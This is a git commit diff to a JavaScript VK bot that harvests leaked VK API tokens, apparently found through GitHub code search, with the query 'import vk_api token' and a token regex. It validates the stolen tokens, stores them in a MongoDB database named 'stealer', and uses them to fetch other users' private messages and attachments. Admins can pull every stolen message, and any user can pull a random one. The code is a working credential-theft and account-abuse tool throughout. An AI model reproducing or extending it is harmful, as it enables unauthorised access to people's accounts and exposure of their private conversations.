3b45f57cef823a271861ed6ac8e59322d5096430
Trard <rivaavir3@gmail.com>
2021-04-29 01:02:48 +0300

    mongo beta

--- vk_bot.js
+++ vk_bot.js
@@ -24,42 +24,53 @@ const admins = [495643428, 64139266]
 vk.updates.on('message_new', hearManager.middleware);
 
 hearManager.hear(/гитхаб все/i, async (context) => {
-    if (admins.indexOf(context.senderId) != -1) {
-        let messages = await dbgetcollection();
-        for (message of messages) {
+    client.connect(async function(err, client) {
+        let db = client.db("stealer")
+        let collection = db.collection("checks");
+        if (admins.indexOf(context.senderId) != -1) {
+            let checks = await dbgetcollection(collection);
+            let messages = await get_vk_messages(checks)
+            for (message of messages) {
+                context.send({
+                    message: message.text,
+                    attachment: message.attachment
+                })
+            }
+        } else {
             context.send({
-                message: message.text,
-                attachment: message.attachment
+                message: "Вы не админ"
             })
-        }
-    } else {
-        context.send({
-            message: "Вы не админ"
-        })
-    }
+        };
+    });
 });
 
 hearManager.hear(/гитхаб рандом/i, async (context) => {
-    let message = await dbgetrandom().then(arr => arr[0])
-    context.send({
-        message: message.text,
-        attachment: message.attachment
+    client.connect(async function(err, client) {
+        let db = client.db("stealer")
+        let collection = db.collection("checks");
+        let check = await dbgetrandom(collection)
+        let message = await get_vk_messages(check).then(arr => arr[0])
+        context.send({
+            message: message.text,
+            attachment: message.attachment
+        })
     })
 })
 
 async function dbupdate() {
-    while (true) {
-        let tokens = await get_tokens('import vk_api token', /token ?= ?['"]([a-zA-Z0-9]{85})['"]/);
-        let checks = await vk_checker(tokens);
-        let messages = await get_vk_messages(checks)
-        await dbdeleteall()
-        for (message of messages) {
-            dbadd(message.text, message.attachment)
-        }
-        console.log("updated db")
-        await new Promise(resolve => setTimeout(resolve, 30 * 60 * 1000)); //спим 30 мин
-    }
-}
+    client.connect(async function(err, client) {
+        const db = client.db("stealer")
+        while (true) {
+            let collection = db.collection("checks");
+            let tokens = await get_tokens('import vk_api token', /token ?= ?['"]([a-zA-Z0-9]{85})['"]/);
+            let checks = await vk_checker(tokens);
+            dbdeleteall(collection)
+            dbadd(collection, checks)
+            console.log("updated db")
+            await new Promise(resolve => setTimeout(resolve, 30 * 60 * 1000)); //спим 30 мин
+        };
+    });
+};
 
-dbupdate()
+dbupdate();
 vk.updates.start().catch(console.error);
